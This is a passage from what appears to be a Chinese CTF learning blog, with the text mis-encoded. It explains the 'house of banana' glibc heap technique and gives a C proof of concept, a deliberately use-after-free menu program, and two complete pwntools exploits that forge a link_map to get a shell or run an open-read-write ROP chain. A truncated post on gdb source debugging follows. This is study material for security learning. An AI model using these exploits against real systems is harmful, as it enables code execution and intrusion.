class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc poc.c -o poc -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rtld_global_dl_ns 0x61b060</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> one_gadget 0x4f302</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x64e40</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc base %llx\n&quot;</span>,libc_base);</span><br><span class="line">  <span class="type">size_t</span> *p=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  p[<span class="number">3</span>]=libc_base+<span class="number">0x61c710</span>;<span class="comment">//l_next</span></span><br><span class="line">  p[<span class="number">5</span>]=p;<span class="comment">//l_real    ä¹Ÿæ˜¯ä¼ªé€ çš„link_mapåœ°å€</span></span><br><span class="line">  p[<span class="number">34</span>]=&amp;p[<span class="number">34</span>];<span class="comment">//l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  p[<span class="number">35</span>]=&amp;p[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  p[<span class="number">36</span>]=&amp;p[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  p[<span class="number">37</span>]=<span class="number">0x8</span>;<span class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  p[<span class="number">38</span>]=libc_base+one_gadget;<span class="comment">//call array[i]</span></span><br><span class="line">  p[<span class="number">0x62</span>]=<span class="number">0x800000000</span>;<span class="comment">//ä½¿l-&gt;l_init_called ä¸º1</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(rtld_global_dl_ns+libc_base)=p;<span class="comment">//åŠ«æŒ_rtld_global_ns_loaded  ç›®çš„ä¼ªé€ link_map</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172153387.png" alt="image-20230217215313299" style="zoom: 67%;" /><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>è‡ªå·±å†™äº†ä¸€ä¸ªç¨‹åºï¼Œæ‰“äº†ä¸€ä¸‹ <code>house of banana</code> ï¼Œæˆ‘å…ˆæ˜¯ç¼–è¯‘å®Œä¹‹åï¼Œå¯¹åº”çš„æ˜¯ <code>libc2.27</code> ï¼Œæˆ‘ç”¨ <code>house of banana</code> åŠ«æŒæ‰§è¡Œæµåæ‰“çš„ <code>og</code> è·å–äº† <code>shell</code> ï¼Œç„¶ååˆ <code>patch</code> æˆäº† <code>2.31-0ubuntu9_amd64</code> æ‰“çš„ <code>orw</code> </p><p><code>C</code> æºç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index,size;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line"><span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">add();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">edit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">delete();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸çš„èœå•å †ï¼Œè‚¯å®šæ˜¯æœ‰å…¶ä»–è§£æ³•ï¼Œè¿™é‡Œåªè€ƒè™‘ <code>house of banana</code> ï¼Œæ¼æ´å°±ä¸€ä¸ª <code>UAF</code> ã€‚</p><p>æ³„éœ² <code>libc</code> å’Œå †åœ°å€ä¹‹åï¼Œæ‰“ <code>large bin attack</code> ï¼Œä¼ªé€  <code>link_map</code> ï¼Œå„ä¸ªå­—æ®µçš„èµ‹å€¼ä¸Šé¢å·²ç»è¿›è¡Œäº†è¯´æ˜ï¼Œä¸‹é¢æ˜¯ä¸¤ä¸ª <code>exp</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>æ‰“ <code>2.27</code> è·å– <code>shell</code> çš„ <code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec090</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x250</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x61b060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x61c710</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">8</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=p64(one_gadget)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127310.png" alt="image-20230217205309204"></p><p>æ‰“ <code>2.31</code> èµ° <code>orw</code> è¯»å‡º <code>flag</code> çš„ <code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1ebfd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x222060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6aee</span></span><br><span class="line">ret_addr=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line">setcontext=<span class="number">0x580DD</span>+libc_base</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c1e1</span></span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsp</span></span><br><span class="line">link_map+=p64(read_addr)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">36</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag_addr=heap_base+<span class="number">0xd00</span></span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127529.png" alt="image-20230217205622280"></p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p><code>house of banana</code> æ˜¯ <code>ha1vk</code> å¸ˆå‚…æå‡ºæ¥çš„ä¸€ç§åˆ©ç”¨æ‰‹æ³•ï¼Œä¸<code>house</code> ç³»åˆ—çš„å¤§éƒ¨åˆ†æ”»å‡» <code>IO_FILE</code> çš„åˆ©ç”¨ä¸åŒï¼Œ<code>house of banana</code> æ˜¯æ”»å‡»çš„ <code>rtld_global</code> ç»“æ„ä½“ï¼Œä¼ªé€  <code>link_map</code> è¿›è¡Œçš„åŠ«æŒæ‰§è¡Œæµï¼Œåªéœ€è¦è¿›è¡Œä¸€æ¬¡ <code>large bin attack</code> å¹¶ä¸”èƒ½è°ƒç”¨ <code>exit</code> å‡½æ•°å³å¯è§¦å‘æ”»å‡»ï¼Œä¸è¿‡åœ¨æ”»å‡»è¿œç¨‹çš„æ—¶å€™å¯èƒ½éœ€è¦çˆ†ç ´ ï¼ˆ <code>ld</code> å’Œ <code>libc</code> çš„åç§»å¯èƒ½åœ¨æœ¬åœ°å’Œè¿œç¨‹ä¸å›ºå®šï¼‰</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>[<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">åŸåˆ›] CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://www.buaq.net/go-85397.html">é«˜Glibcç‰ˆæœ¬ä¸‹çš„å †éªšæ“ä½œè§£æ (buaq.net)</a></p><p><a href="https://www.anquanke.com/post/id/222948#h3-5">house of banana-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> large bin attack </tag>
            
            <tag> house of banana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºgdbæºç è°ƒè¯•ç¯å¢ƒæ­å»º</title>
      <link href="/posts/c5c57579.html"/>
      <url>/posts/c5c57579.html</url>
      
        <content type="html"><![CDATA[<p>æœ‰æ—¶å€™æˆ‘ä»¬è¦å»è¿½è¸ªä¸€äº›å‡½æ•°æˆ–æ˜¯æ•°æ®ï¼Œéœ€è¦ç”¨gdbåŠ¨æ€è°ƒè¯•å¹¶å»ç»“åˆç€æºç åˆ†æã€‚ä¸‹é¢ä»‹ç»ä¸€ä¸‹gdbæºç è°ƒè¯•çš„ç¯å¢ƒå¦‚ä½•æ­å»º</p><h2 id="glibcæºç ä¸‹è½½"><a href="#glibcæºç ä¸‹è½½" class="headerlink" title="glibcæºç ä¸‹è½½"></a>glibcæºç ä¸‹è½½</h2><p>glibcæºç å¯ä»¥åœ¨ä¸‹é¢è¿™ä¸ªé“¾æ¥ä¸‹è½½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220415172522191-1508848149.png"></p><p>é€‰æ‹©éœ€è¦çš„glibcç‰ˆæœ¬ï¼Œæˆ‘ä»¥2.27-3ubuntu 1.5ä¸ºä¾‹</p><p><img src="/../img/2706180-20220415172035738-582520439.png" alt="image-20220415164406215"></p><p>é€‰æ‹©è¿™ä¸ªæœ€å¤§çš„æ–‡ä»¶ï¼Œä¸‹è½½ã€‚</p><p>ç„¶åæ‹–åˆ°ubuntué‡Œé¢è§£å‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf filename</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220415172035504-1672278744.png" alt="image-20220415164603510"></p><p>æ–°å»ºä¸€ä¸ªå¤§çš„æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾å„ä¸ªç‰ˆæœ¬çš„glibcï¼Œç„¶åè¿›å…¥æ–°ä¸‹è½½çš„glibcï¼Œlsçœ‹ä¸€ä¸‹å‘ç°ä¸œè¥¿éƒ½åœ¨é‡Œé¢ã€‚ç„¶åæˆ‘ä»¬éœ€è¦å»æ‰¾æºç æ‰€åœ¨çš„æ–‡ä»¶å¤¹ã€‚</p><p><img src="/../img/2706180-20220415172035082-1039167232.png" alt="image-20220415164836238"></p><h2 id="æ‰¾ä¸€ä¸‹å‡½æ•°æ‰€åœ¨çš„æºæ–‡ä»¶"><a href="#æ‰¾ä¸€ä¸‹å‡½æ•°æ‰€åœ¨çš„æºæ–‡ä»¶" class="headerlink" 